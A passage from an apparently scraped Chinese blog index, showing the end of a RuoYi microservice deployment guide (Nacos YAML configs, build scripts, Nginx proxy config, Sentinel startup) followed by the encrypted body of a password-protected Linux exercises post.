server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9202# Springspring:   application:    # 应用名称    name: ruoyi-gen  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9203# Springspring:   application:    # 应用名称    name: ruoyi-job  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9201# Springspring:   application:    # 应用名称    name: ruoyi-system  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n\n# Tomcatserver:  port: 9100# Springspring:   application:    # 应用名称    name: ruoyi-monitor  profiles:    # 环境配置    active: dev  cloud:    nacos:      discovery:        # 服务注册地址        server-addr: 127.0.0.1:8848        username: nacos        password: nacos # nacos 密码      config:        # 配置中心地址        server-addr: 127.0.0.1:8848        # 配置文件格式        file-extension: yml        # 共享配置        shared-configs:          - application-$&#123;spring.profiles.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;        username: nacos        password: nacos # nacos 密码\n运行\n打开 ruoyi-master 下的bin目录,先执行clean.bat清理,再执行package.bat打包。\n打包完成后执行run-xxx.bat\nrun-gateway.bat,run-auth.bat,run-modules-system.bat这三个必须运行，其余可选。\n前端运行\n配置\n打开vue.config.js，将下图位置配置为网关的端口和ip\n\n运行\n先在命令行执行npm install\n再执行npm run dev即可运行\n\n生产环境部署\n在开发环境的基础上打包前后端代码即可对生产环境部署\n前端部署\n在ruoyi-ui目录下执行npm run build:prod命令即可打包，打包完成后会生成dist目录，这个目录就是打包好的文件。\n\n\n打开小皮面板将nginx启动并添加网站目录。\n\n\n配置 Nginx 使前端的请求可以正确的转发到后端\n\nserver &#123;    listen       80;    server_name  localhost;    location / &#123;        # 设置为部署目录        root   &quot;D:/website/localhost_80&quot;;        try_files $uri $uri/ /index.html;        index  index.html index.htm;    &#125;    location /prod-api/&#123;        proxy_set_header Host $http_host;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header REMOTE-HOST $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_pass http://localhost:8080/;    &#125;    # 避免actuator暴露    if ($uri ~ &quot;/actuator&quot;) &#123;        return 403;    &#125;    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   html;    &#125;&#125;\n最后重启Nginx没有抛出错误即完成前端部署\n\n后端部署\n部署前先运行起来 nacos,seata,mysql,redis，在开发环境中有写。\n打开 ruoyi-master/bin 目录，执行 clean.bat,再执行package.bat进行打包\n打包完成之后，根据下图把jar包复制出来用命令运行即可。\n\n\n此处可扩展业务代码，每个模块下都有jar包。打包后都在每个模块下的target目录下。\n\n最后还有下载的jars下的 sentinel-dashboard-1.8.8.jar 也要放到一起。\n\n最后使用以下命令来运行所有jar包。\njava -jar xxx.jar# sentinel需要用以下命令运行java -Dserver.port=8718 -Dcsp.sentinel.dashboard.server=localhost:8718 -Dproject.name=sentinel-dashboard -Dcsp.sentinel.api.port=8719 -jar sentinel-dashboard-1.8.8.jar\n","tags":["nacos","RuoYi","若依管理系统","微服务"]},{"title":"Linux 系统部署与维护练习题","url":"/posts/8f70eb62/","content":"\n          \n              #best-form {\n                  width: 80%;\n                  text-align: center;\n                  margin: auto;\n              }\n              #best-form .inp {\n                  width: 100%;\n                  padding: 1em 0.5em;\n                  margin: 0 0 1em 0;\n                  border: 0;\n                  outline: none;\n                  border-bottom: 2px solid #ccc;\n                  transition: ease .5s;\n              }\n              #best-form .inp:focus {\n                  border: 0;\n                  border-bottom: 2px solid orange;\n              }\n              #best-form input[type='submit'] {\n                  font-size: 1.5em;\n                  background: orange;\n                  padding: 0.2em 0.5em;\n                  color: white;\n                  border-radius: 1em;\n                  cursor: pointer;\n                  border: 0;\n              }\n          \n          \n              刷新页面即可恢复加密\n              \n              \n              \n              \n          \n          \n              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);\n              document.querySelector('#best-form').addEventListener('submit', async function (e) {\n                e.preventDefault();\n                const name = this['best-name'].value;\n                const username = this['best-username'].value;\n                const password = this['best-password'].value;\n                const users = [{\"result\":\"4916611c21ad85791f99c0820ac3fc4841c11842e9c935eed94cd34339fda257cbe4131c250b2dfcd38c778cb43559c7150efe3eeac18cb1bec6e37f2ab4b61aa8286fc8350dde5ec3e717e5d58c5e8f92cb959ab46a8cf54eeb71fa4df5e2c1294b12ab5279bcf0e9efd7734f2163daa835ee0249323469cc7bd38e67d60d9b7c688208b36388d55781df3cda689f115cfcfec9b3151d0723cceac54ab82690012f550a12c7cf6615e6d5c11f5a0b5f126235053519e31db222d1f5c9ed1267ea4a81dd2759928d0ca5e56e05cb5f853eb50a4b91f3eb98a36578a99b33169a502014e604a936a1bebebc9270a36bf5c43311f54cf9e3d49f68d1eeddb27cd3155fa0ce8e50a97d6e7dd7bc7254f25a9937b86822d8ce30bf8f1fa51109e511704e4014cc5443476869ca7acbf508d856f9f97b5518146d75c0127328cc36a977bf5e1313e811fb209806cf47af0ad0b955daec07431cb1bd6e61c12294bbe970ed49aaf738941aa00d6582edac32a604efce0cd5434e91448cb3b4d443ee8bd9bbf2ddbb0b26db147dd04a39b0a97f88c4ff6dcfdc1962ca02e363d1087d2190e9397b4a7a987576c8eb9260b16f94549d840d4e34767b35fd64b8a6841fa7d9c58a0b83bab37a874638270d5553fa26798415a0abeaabe4bc0b0c19fca2acc834c00c28cb80d5c65ee97a8eac79fc45940de0c241bde81afd3643d00962d6db0b7e3ede2386a1518820e3b826d78d012893e9f87fb37cb2f49f149db32df2dbdff7f1afdec81e6cc140124e3de965aa56c566438fa2e1701b25aaa40a300ca2723f8d0ab065bdc08716caeac39abc87dc6a18bc7f2a3bfd4232defc42f231c22a1aebbe9003be9ea9d9798ab5dbda75e930fd519faaf88824ab2c1ea3067781e616de2335c064263f62bac79007ef9be41399a7fd61645e23020f73ae411d7913d3476c7a3f2ccf31609ee4cdebe549129200a5bbfb802ddc80e60ff99f8bcf654bad2eb7a7ede37de1b1c3dcf5f1e3e1571ae558d0f47d845231d66d0ca70820e22f42ce8b09a44bc0ba28d2ad6c22b280ec8222494541888c975eadaa3e85a764952ff7337c3271c9253ec85523a9018e6f9d33881fb4b62a959d55ad6833bf146959687d8ad6f929e49899b6cb278145fbc8d3b5cf40e31e54212308124e52ba0f93278888aeb37c12a70c9bef42a043e71352f603e6af4b43278becbc365e685c1f1ab61705db91e9023a9a113a2321688f156fa7f766a71d9250f3071328cde1e66f526d8d9c1c8590949d753347da613799341cdc62d057a3244adabec6ad7464e4b38e676ad48ea265dd4b17c693b0965a9af96dbdff12e08482e2d4e54d067e6acd81b1e6e293aa2235dde5a1b847bd8912fdb6704b4a2390c51f609eb331b16581ddd0bedc64a72f81c83741766980664998b9502d02c633de5de5637d62cd9d0b84dccf15b1c43ac0590e942a97bc4829a648abd4b5c5a3ea10d2ce9c117917f48d161db4a315e05361ba56d9b0778bc93c0a3451450be37fadaf435cee40340176a8822451de686b5eff8454749bbc5c6579534869018d9b6e8f1a4258373a4b64236a53faa4eef92fba4bcb95586557b8349c30b324bd09d4ffddb59fd71531439b8b018e64de9687eeda077eaafe1ca1e7a071905ff053cae84a013feb5a01e27b60ca5c8d7aa1b743e7f6bbf8543cf72392b31e85393db305934c4bfcaffb5374c15947035cc46b5d7713dc125e392144294e2dcc4b55cd9ea80c0a993ee2a9960d957c2840fa7ca947b3efbdee74690074006002fa1d0088569b73ab735e59b24b78ea5964ab733bd58ab11a67587b205bd1ff29fec50c3a13af9f647e40a7cc0fc45f14ab846a29ad9d682ad090b0cf0e2fc8f7f81e5b6b7fb4a6e06492f15a422282988ce9fd88c5dd439f8ef1aa3a0eb3734fc44c18a99be6a0a282c2889e87606012efd0adc7403703b67cf5d83b3e07a3db3bc2ff0b6ba6a922fc3a691a480b4f3a4a512cd9babd8957e6f00a607aed491e2cf8393dabbf44166de7cc470bbaa8158714b5dc564e78ef22aa65eb57be71b2792ad03cb23971c968c855887809f1425cca7bcfe6a14be11504f86aa232262ab56dd42fed32e1cc31f41b1f6271f310dc966e7f11a6933321166990364f1c69f61e4bdb9cdbdae07eb05e55615f05498889b73b1e088fbc18cabc6a2a8857e47fb569c52c47dfa5f497452113e55fc06d31869c1e58a6d62f01b5b0530aed07fea999e8ab6e2bfdc99ddaed572dd8cc4881c917cbf67e39c4bb8977fca7cc8e07ee920a46335c4da16806ff2e00b8826003596cf457a74c6e42de9636d0a41cb78a80ab8199ffac4a64f1bc8e0cf6c80d93648a572883fb29a4af77688a2e8b33e092831a68537838911bbbed0805e253888df7f0a029f7e94ffc6213d16e9ce909104d19e95ef84a790e0a739709d6e0bd0e68aa6841c86ca5cf79fcef23784200dc7a6baace10e06f1ab65cdf6261c296e38eb26a811ac4bdca56604d5c566eb0d4e7bcf71a5402af4b9f556220d7be7e5878a52e1fe973e4347dea318ef6cee7ccd9867026da9f215f8549194e241eda13cb6e3b546c93b1ddd60831bea2c1a01ccedf912e0abe58c9c40772fe0c6e3b0db6c33f9be9f6ff796cf040173d544c2aa520a7effb2a8fc68b37e7409bd3a00fc993cb0a8f42b195cb9a83b56a34030c790f18460746ca12e9eb1f80e1bb9a3994c089689e075bea9741dbd0469bca311fd2b2fc3cb3c3178d0ad55bbcdaeb48f0c80b10ce9303f3e43b5488d300d42dc5e5ed769996b582c55e6d9c0c24067ff1eace982fd5e4d16b2722e6b4079668f876f51a6594af9f231385af1dcb81ff0bf8bd9fe65cf1274349827c7dcea4a1371f5d5f6dbb0d1a840fda045bc28c4f55b300a14f2748c7fbb45644dafcd6e9047b9e7a33507c4c6a1a97b638087115957bc8cbee40f33555d5471473ba7ec7f80c51883b61ca36cd9685f03ff120d9313a2a0a283ba9add3ed839f1f754d28ce04824351ce1dc7dc97b33f76e4f2da89e2c8a988ea85e9cb9c4da3854157bd7ffe65b27eb8ba6d21089e267f2c08929ed4c01947d39b0a50b93c0dd3efb241a3f351fc3d28196525b246d8faabf421e434f162359baa1603dfd813ff37d35a0e5b8aa7d409bb228e3c981d82c4daf7e179d0f788f9e7cb167d80e9da108e5a236894e12c03928262b0aaea079aa1da4ec6f89ba8a6f8f68b6038621b9b304dfb4831c9c98a23aa3ccae0158c070b343e68e2e927996cba371da27f946bc1a373a21eb4b83338cb38b560762773fc652cd0edd1ff65d9da4e336d439c112a3376f171561552d29615cacde2b7b7ef395b26fe49e835d3e87e480bb83bdd71aadf93570bb8301389cf718b0a8fd62820c036edc2ae15924140a0e2ab1df413002673a6a83145b39d61afd63bce496e898dcb7739bea5f3f59820bdd45423f47da85fc8c4a83865d3c25b8987849c8d189da18c0123ffb68d06de3023295e5b4d088cc7248e9236a8565cd80ec07dbb8c9302616240586edf1593b88b3d14c513f32260dfbd5edd1d5cd094bc498a194fe4e19b60903a3009c89ec1b256d4f1b8921b71ebc0b05d85bdeec05837f2f3124510e4525d995d51572771ceaa13ce84cabd13a624dd594ba5b05d5301463d76f67106104137f605faea9811e1ad95703e38c47780f6dfe40d87200ac5e9ae3eb61b413cb2caff115ff7a1152e897371085bba6d7d10e6f7538435c0c9a7cd288c94ca598145b3696e9713e2abf0ad976e4e5f4ada042a6440f8c26065fee7515d7f935cb6921af8ecc718a6a8435ee93be7807dee3ed87960196cf1edae9cec7bcd29064cae7caf1fc2ce770aa2a1c2e47b295ab3f279d9faa378cf15abf39336fd7cdd0a6bbbb395c27f8593277f55a5745f6c99272e4546f0bb6dfd7cb689cd24c81e1a66fbc2ee6f96e2073b1abbb70bbd126f90da57e4d0f506edc48924eb63d39e1599e471600902f4ddfb2111f2d388c17cd148bece9b108af903f4794b4cff91a8bbde22d71237885bbb7cf8a9ba17e78774a7ce9911787af344f104b0f9932dac0dfe3a1ab3bfb50e18fd9c23d6e9368c5a6d087b94d629e262c72ef96af274e5678b3fa2b685549e5df25a61dca9a1fadf5a3d1fda0ab2c5e4adb1b6f2d3f9f1412ebbeabf1faa5e32e34f5f18f03267643eb944ca0fd2491746affe6107fe5f7995113b3f773b3293b2016592f516a06f79a286c674b7cc7011e6ac36e5cbe1716863fecee7de4993675ded673509582fbebd3fce581937092cac9e70a6f7b7b1eb83e8cdc22da20c16408ec39d33844e8a2bd212accc3abc1d9293ea3c27872386be4ad9c8324f58d3e87d20b7ca7f08dfccde8470831719db4ea1a7351c4e23ba5abd70643bed83e0bee5879cd669f4a829c5fb33bbe1b2e827658707c75edc30bbea96aaa673462e1e8319a9bc9fdbeff3aba09e615600c2ee302fb36c774fc955ae07a335d2fc42e798743f54c78e802714cd76a14a1ece4e7df5f153a4fb1f2227f59c3e652c31b83c513217c0e7c34c76395505f4802815f0b7250d1165aff0e1efa084de66c73bb1e0a0f129dca66797d0220909151e198cab3ccf4298e38364a077032aa831502822894e252017b2266b1a67a16265ac07c3595f10f9fccf14544a41f84eee7900a467c3c28f90ff9d7cca63baaa798c8c92b3df3eb778984927cafe3768cd175b9a157faaecc3e95a5783c6ce957bfa1782afe7e8e17629f4a45675cd2a2fb69f0782bdfbe58e091da9dc8604688b3a8e73be7ed65289584fdce4aa4c5685963745ec7089513794d2a7710a754549b03d49d187a6cb3f7d01b1d8af0f680137468aecf8c2e90b084c2b0024cc027609a3cc6a00be8a6eb11a2ef84c5bb7c5b0b09bc8c10bee64358066c4b78a8e5bcdfaa8e5af521fcc8195724e5e7fe992a23cbe5c4bbf4440c82683ffc7a23f838bc24ccee7ee7ec737359244efe64fc8f64da58f165c05b3e49b84ced7358fce2fcb908998c03113a82efb36979ce30758577047e8fd902f8b37b8d7ab3a5e30b713833994b3b8b4b8e859b1f9d79c2c9af23fe87795eb1a01bed8bba7d382ee879c22d33718ec86f1d768d6773401df8a9e8ecfc97e9e7a551e8d4d65898b300cd335cac9f4d7dfb0c6d679a1ec3f123661a911606bf5de7cc45f625c547179ab88f0bf4eaa4a220ba36eaaa90dfe8e8bf2d0711af07d35fef93125947cae7eaba81a91fc83738932d4b9682a44949fde71911b12b53610b2ecb793a308e38173ef94b490998cd9012b0e4c535db4d04e40e85e03b8a3355655ae53d3ee15a975c7779678f42c3efad8e26ef070609cbfc4dd0e3be326a5b1e386f8f94b0027a2e2e7e385e3f52ed5f18414c91af66892ca351dbf536d7b36fa04b35cea885159ee584d91e13ff28f8593e401e6fce7304ef00f74484310bb2d8e1c4dd2b0e8b0133bcfff864cdc4c51d4044896554357eab8f1135fad6560a756132bc10d59bdc644364b0420051197d737cc6290fd28cad54472629df1243e20868a01ef3c9b8823f7df7acb97873ba4afb821353b86ad78f39c2fe93e9c924c6cbc512572a4c7f928e47a61034f0e2af439cc38e5b858aa8523fbd156dc210f81a52e139b8c33af27e9faa088d481be305eb4ce54556b40db32d615254a1e981135156d71cb02c86f7b4ef06e72a81bb46818eb667d85765396f10ff17d204aa30721c99262b9d183fcf6cc35b318ac7bb07dcd1783586dc612a6c5a12968dacb23836e62e4b924191a6202ce87b5ebfb42d38769625e15153066aa873d93ca785aa29ccfbbd89745f6fb333b8dc1c2ad629ab7d26e72d0c2402628d0881358e533a642cbe48f6de802de30646207a927a9290e07672fa0c71a33a39a68e84a2cbc6da05bffea5cb6eaf44b71b10e6bfc33e2a453692b8a8ce46c504fce1467b0653bd6f726f31c31a7ee05c71ef649c1f85cb3f60e12bc4dd42d4e3a9c4f937c70a265fb106d60fc5baa48f5b5bf269ee77bddd16bbb8b2eccba20bf61372eec061865a4d6ad1a5ddc9442f3f08299fadfd82cef5863b753a3ceafed85854302d8e0ddc1952b59c4df00838af62cbe9edea153cdf295d0b8328f2375a982bd4c6219a2c3e6ed90de7fdf447daf9261609c7ef9146b849ff9a2903c03849f09c893dd45bb28a946c4b2dfa8fd97ff9e2fb6a6933c22385e242631865777500afa4215b02fbc7219dfa6ddee9d4bf0d81bd15c305cf0c860b6680df8c91f6895750710685dfb3a12aff34a18605d8cab963cf2dea4bb5225369bb8023ad2ad52da1b866afe8f8e4e3de1b49eed5a2aebbca22a99486c626ef85117f64f2b20f31269e72478324062dc94c62aeb70422f7e4e9f2a76e53bfb87ccf770a846d78aba21f90d2390011196388aeb94f9aa1b17d7b887e8c66f4bd3ab02036b1aa3f1193b73cc413122e40a6de3c9603bbb0b6ef57d133913cdec96a8a7dcd513e5d57955f52c44cfee42018d1e710242e60c4e28133f542acc1580bbfecab32def94b32cfa1ba73d350e94b81a57e84e6af5f12db4c2649a304a07a317264b27cf4e8ed80978e4a018b82464f42f8b9f6004ed8af3c4bd79768db97369dae535bc10078d0a778434bccea399e26c0a4b1ae1c79594d99242b599f1b5c5b019538b0f7f0e7e2cc9960a8f2c1717c44bbd5f13c25b738309f6d40a454bf3866f1f03374d05eea97ae81bfb7be1b5285b574f6a722e7072dff4e932118752bf7257fafb47297a6d1563ca862741b499f74dcb67eff2e6c54dd298c227cc889c00190ef57cd106294a45252970598f239c37d428e39d3dae5ac05e2784425c9c91d1ec96ae04cd57dacb9aa3eae2b5a40b63f24dd9b9eb8ee1433031de955da01dfb746b88ded8e885fde7637be876eb758d40f0fddbf51718f681514d09b9d7116a84cc9fa546d9c2c5c315a0a3c0fafe8d3515626edd9722570d70a01434bac21ec437e3958e4949a3c966c16a97262d8a6e70156ce6d383e448a313de93868b8e62c1cf87fc08afb61c22c08db2b1411fe0188b079a8f62ff3f223b6e36c5f6cff3441090f20b64e9e98d9ed3da62ab8aa3ed0e8b9d601d6779c584876d67b5ef92dd9fea6958df0aee47363890f27ab4cfa54f5f5c4a5962b2cf3e7fdd57ea0c832b3266c9fda4995c20e72e3a400f0e40760c5df1ed9563f2e14a5b90e87d7091b65197a7e8deaaf30ccff91e728f864e1e7770be4e5019ea0b48ff7adf288f8f04115511cc6729326d6b5c37861ddf0f9ee0965565169266ef60f4d7682c842c0ba668f5a75591d1e602d48429d41b873893b4720a2fb5e7defd7c8bc242096073c7e377000ba986a89d06c62a761a07fcc7b5844e4250012c0510d6f157b61cad2177c67dc955b121c60adc6a09e694b1cea1febec515f4662f6f301e3988380de0b71f86064180e1c6a238c0c758a519a30c041eacd828110421bdee1ae09d1ae1ef683d3e948357927f9fd01c85e1d3951d9f8b403247b104f9b31c6cddc8aef9319c58ec271d5ac0be0e5fd1ce83c3e117bada5dab451991ac380226322c586a2b5bc5fd4d2e675d2806f5f784cccf61afb9ea8aeea1ea1ee8b446cc57607303413b4b0e68f4caf007c1f4872a8ebb2a852a8c2209fbb125708813639e065d84a3d855a11109fa56559f9642751832346bf8c975f44a2a29adb5a99859cd8d62b32b2e47b1457fc15e1a5938812607732f01e97649ad3a1f1740420f84b8932b16c99df37a5cd85de7db99bcb74752461cc61511e37644ad921e40962385b472bc7bd84ca5e81e347a9c4458115b4872409d6dec8b9f6208726020984e23f2781f3e2b9d064fd59ca02d8a29b1ae180950b0daad70acfd4fdb9b0eb9259b1f981cbbe77d6c08d3437d9302a1d13065c6d6f6621285167e6b6bfb76643e521cc8bd89d2d37dcbbdee2a5e4ab3944b95a6867ec6bcd4868b7326bf80bc8ab258ecfa85f5ba6f895513be1325fdf26d1e278f79c74001a0f936f3fa864bcad7555a93e192dfea03da18ed95be676ab0bbe3a0d8c047d2673326a4d1715c59c219d7d18060383df8b65cf2dbf45a6f14255bb1948f84283bdaca498fa060e50bb6e03d75bfb24ef0629a3c4f3b0b890afbd09b64dfe2a738401823b3ca3a247357cbb5fb327cf514b4a93ef6874084a6589486dcf71e9c3aa80b32e96475158f16b31c29fb4abf140175d1f7cc97fdbb0d0e57d530672da08b56245d73fda620f59365e31321ea343663d9110e9dba59873825594132daba89c4ebecb0651eb9a3058bb5479c531246e328bd0c1bcbbeb0f0ba8e98bda2641f6442be778c6e45d1c5afabac4ba04123c5bbf8b0bcc129351c89b299dbe1319f3fba416f34a024ce07c61b5aff761cebb3fd7780920ce140812ad375bf18cc21f9c87c894ec9fce6d1b7a31f49b43bf67c39d6a3510a90f9856f44a797817654cd6d0f19f2c6c57861c3cd6f932b70c1a14603524723292f47e8f37ab4e422c7ba889d49a6e4cc1fbe868e4e21f3cb100fa89d05c50edf3c9dc918d8af35c58860aed167cf8659b58db8428dd529db62a75f4d6961229c6d4d644115845eaefdba5c80287055701a57418054fb09f05a67f3e8278fc00faaa6f686e8a314077bf5b5421052e1be69f6b8bb0da5dc759e78cf932daf95f2084a347ffe8dca5bdc89db133b45fb7b13e77b28c373af9edfc09aee204c3c64f88c09fde23b118412235137ccc20c73314a5184dc77f169987231ea49f717b1a15ec4f7928089d398921fc587a0201826f3f8c3ec3e970cbe8fcf711090177b7a9dec0676e425d6c2ad7d2fb398a2dd67fad28b5e22e483f1344061b30a8ecbc0be09a9be266a4ca34dbf9db363bc32699c8a142d53e13db76226ded6f334ecebc54e20b69885acb195b79f7d640bbfa98b1ed737eb081e0bf6f0ca8e4417fc3f36ba2d0389b649b589016c479aa28819ae661ec6e643f5c5b1447afbe20352071283d182c3c110c450851dcb43bb6a5ad0317510b21130e5d4801b5b6144f65a1e3c949ed2b76d2ae53caff287560d12ce1f1a972c765f87a2f3198004ef4875d70a4723fbf9fcea740710dd26e4251e64c26d7e1028f2c251cca4481fa656b4258e791cc72faa8d05591b4b019fc39fef232ea2a901fdbf2e69e93d65f9747dfcd1efb9739ce2f7cd4cde7d9bcbea82b8c712a4444f90dd6a0926cd6f529e8a1f72ab8a83e900f113bdcf5d716f5fd40da2693537777f6fc18bfdcac98380de8f165e875e0803334d851536f2927711eb3b5c938f7c930e710905cd232daeeae11368ba391c462caadb8b068a06393ca07da0e2904cb081a8d2301ec49e0fb9d66d88b9f74ac1c196c3df007f21b279e31b3ac3c81bdb4eb43b3147b019d7cbb5d0d514c83f09ef2a4a3ea73ae0ac15c6c66567ed3a881bb7ca9acbd2189a35626a68443d99fc95c17641ef837755951e8a99a457acd46db46ad4bace04584834f798e773a8058ec7b838eb7715b348265dc2df59206547bd5f499dbbdf44c28ef588b23d2c33f63061059b5e0931849fac6f2a7dddd11a40ece475e7fbc3fc167c329d88a68e49c4f4bd44f49ebc224ba918e4cccf0ac294010f61308406247bc934d9b5033c9791573cc54534cefef92519e95e1c464811bc36795560198a1a488ee786205bbec192f05c9f6a1c9cfaf94a34423d25b320601bd383fc42b222018ed8c447162b86809b907ad9abff12a681f480dd28a77d5ef4cf6adcfb09882fac2c1fe9bef10a7875cbf711d926d41361098aa6482d91fd0b1f02908f66f06b3e48dca7be50c715a36de9237637cdf9b1af4dc5f391f9e906ecb2129a307e8958ee007849560771946970ca1eecd0e361f9808752793de0f02a501236d2ad8ddf24db503ea528d06d11f95090e47c3b05b76c0f9468bed85e42bc46d7d0a77890fd45b3f21b50f6cc5b140236c66c68a8ecf19f317b11cd8f6e1f793779999d252363827675b51f8b4f99b3b4eb9511e2e0cdcce24532af9753738a1a1115284e6d6368703cfbbc4dcb171df67c3892f6429443052c5d0fb7eb77037f25f22178af3ea5c49293350300b15c88d744dae11adb84e9ece7fb15e1c78ed34f9195865b203239afb76536f278917f98a1db4a2a448c9d3fcb01080e2a39c5b29cfb894d33352ca83ef683f52ccdc7fab8371ab2cc5891422a87fac6f15a55bd2e0d8e9dbbae1e36d9e0a1d0d065dbb0a5c1e0acb1c42ee09667e565e6340772c6d063b742da25ab2ca4319f5df6e154dc9b168891a51ea38e8055df95392b95d84226cab1e09607d9d61a50351b6f791fa0befa1132a584a64596c4facf53e4db04d490d75ba594f9021b8e31bbc889eeea3d698f7bd37eacc13929b55220574141a4e84520671dcdda698d4f7c37f99cd8020c5c5e95626a380446f904cea9c9c0de55d6c20def2cfd9607e0d498a06ce52c6ca0529667aa5666a7e522c0e9c9911df21976b45f2bdaf9cac7f29e44d9640b64d8c5f4e983b9b309af28d9ff66a9af8023833d2473bae39c243abf12242c2ea61def9dd75b29fcc42498849d5afd8cedd629c2314051f95d8013c2b8121f9f0a66749e408c7f3e1646b9b983a42524a69c2a2a0cd24ea23fa9805ab6770a146d10f2e710215d99e06a98861e16e0ac6b23717415d918789529fe7dc57db1b5679da7474392920eb5b69b1f24dc4444e49055195c83c1ff74a148b3860e788176e772ff802f03062f38d7d8b0dc4d904a51a5809774f2ec804b2f0b3977e65e3dc954d8de8ac7745aa6798091052373ae232dd1544c2b818f22e162dd12e2b24ed2e18a17599e80e324cc4a5b25327c778794553173089ca65096c39b3d8a53281e9ec3f63263bb4e2e19c047130cbeec30569984b948624b54b8343b6b0809dd2d956e11d0ec9347f015526b0f929990876349ba7cb2299822e13e2f49b50a750ab99df4e6947f11c751bcb3b9278d9eb8d6228e043b4f6c5779bc7ecffaa9170f49954f7aed4d06c800f54b03fac34c59a268e541c9ac5551eac8eabb2145d8bd38d81a7a9eca4315f070307f23bcd59a4f2a38b5a12c71996567687482f21d4784b6546843261a50d208b74e7a6d78cd93dd3ee98b6d05178e15ffd9a9ef45995cf4aa5a1aa35cf5bd0e089e62dd89314eedfbd2a650472f8025b7c247e5d12543ad1f5b3c96e2eb976de9d16a28d6ac02ef974182b39a59c7811d39683f26b4789ec2adde41804a841f3932bdd1659ce21501bd84f26d47a5fb138e7c4fc61291612b6d3507b55270d9fafa85c3788fb77521dd9f720332a67f0b97f8c809ca829e036a1e8377208d67d5542219ab5bf5f3994c3331240eb90a7966ba7a9f6321128b677b9ea2b6abfb3b9c8685906d32eecfefadbc085b50533ebfdaeff44e1cf0872fba7f31f2d7782b38d78678eb88ccbb0572f1e4967f7592bea48c8f989753f704e2369c69120a3f298a511d03dd795beac75cc0f24e0db3da1fda064527580f5799883967c922ec194e4ba58448e4ec4d3f502b472f335d349e32d184244daa0d02e0547626d258be6f48d6a858710e9862c8aef3955d313692ae896f6d22188a70a010ef1823a4182274b05a31aa87660addbfc621a006d8631acfca8bdd18bfc1be0ca95c9ad3c6e9ff409ee2c617e76eaa2fff6126924dd8495e8e3002dcc3a5e316fa15e92dd25d9c8e60ec97dce3a7f5ff7d7983559d656cddb2613f4689d9b17421050eff07980ebb25c4c3ed8ea493b674c6af4688087a4187558964cc3f74e624b510eadc5da740f3be4e3378d9dcd43998fe6d518adef88d53ccd823dd33c8f427e45375e600da505c9b27b2a04b0f4bce04c1c824adb6b3ba575c70843db70240815a9ad279fa5a9f65f6f63094d920534ef52a6a2b397008ea2b043c1f1d5aeb61e6972b162c1d44e5b22277842c6d522734959823ca0ba3f5d2a995fab14f3760b85422be6bc061100dddd6c8342f467afa2e80c9283992ca38fb02ecd3602dbf2faa3492f7388bbb50558621ff10539d547bd096776b7f831d16605881b5391b110356cfdbfe89fba370ab7d9d39fc60a8373a0f029cdec45febc0d3b2efa889d9efa406aa2c2048f2cd01000aba4c496a69c9820082da781ddb3d8a7a7190b32a8ef4be97b48bf614b55aead3eef8d27541aa8d10ede65a9a79f9f36cc9ae2951af7ed858020d537f9ec61c5427d314ad7ba4feec4ed0b4d8e42c0fab1aeb225c74318e9193c3dc93ad2502f08fd6d24d554f197a7573d6f1e0b2582e8d9336b64aa70519d56e8a3ff63d219754052b368b275b8c443a454edcc88e3d248c40d1d94c0c110f327ed25f85f97fba49e8d918aeb2766541cea908010fa9944d720ef716aa8bef820ab9e38ac30789205937cb0f4f5a96b36b6df74b7749b05c30c9aeeb0fd5ec497a732a945780693d216aa7e5c2950ac986517480df9ccde6e23ab8079d07e105453bff2fa804b0aeff541b31e12e2494eecfb3f09be1f1179a46ca6f14017db8048c3726f843a8724b90cb19eed31025e28e1c14443ef53d7dfd1b30054fb4463ab029c84f0cf3bfcdbd75a783e0dc55c4486c018ce5957166eae003bc91027e400bf4e75ba1b1797bfa0c9e6f3c71b6be9836e94de4f2f6e457948f3e4e525382ac075e9209a051aec5d9961c3ba5cbe3fd88ac42f4cc5c6510e97d1334077b31eb85bfb283f3222da724b5a1f225233dc5d164c0920000b4169ac81f38e968066353984dbf6d33d4dc287518d95f2651e05ca223eb8f86dfb26725d1fef9db8f82c048662e26c49a913a84c5c54f53a128c4c84e59a12196c8f1824c64416a55b604a77c10298274cf720c131476c98b05f093e80747c94d08d1781d88972e398234123743cc0733321be0ec6ec8cdf731895e49beddf02ec19b9835e99b1588e59b96c32f8497bb15d23dedda0770bbdf913e930df44490781f533593e17d22e3731fd84e47cf5cba3a34a64266dc8e9afcef06708bf7ac11185c25d9e20c4fa636e48e5fee99dd61ac77d1ed6f4b3943b886b1ebe4a1e977c511739f89cc7ddd147807918bb6171da48141a43b5c6801b8be7169c7ff8b825010cd174388b4a15578c79ad431f34cd8728575bfcddf6447d6b87a6804fd60561e948040129f2eb997638a83f69cb7d7879034f4ccd6a3afd5df22971a34ce075222b075603b08495172606e2e51b9d5cd01b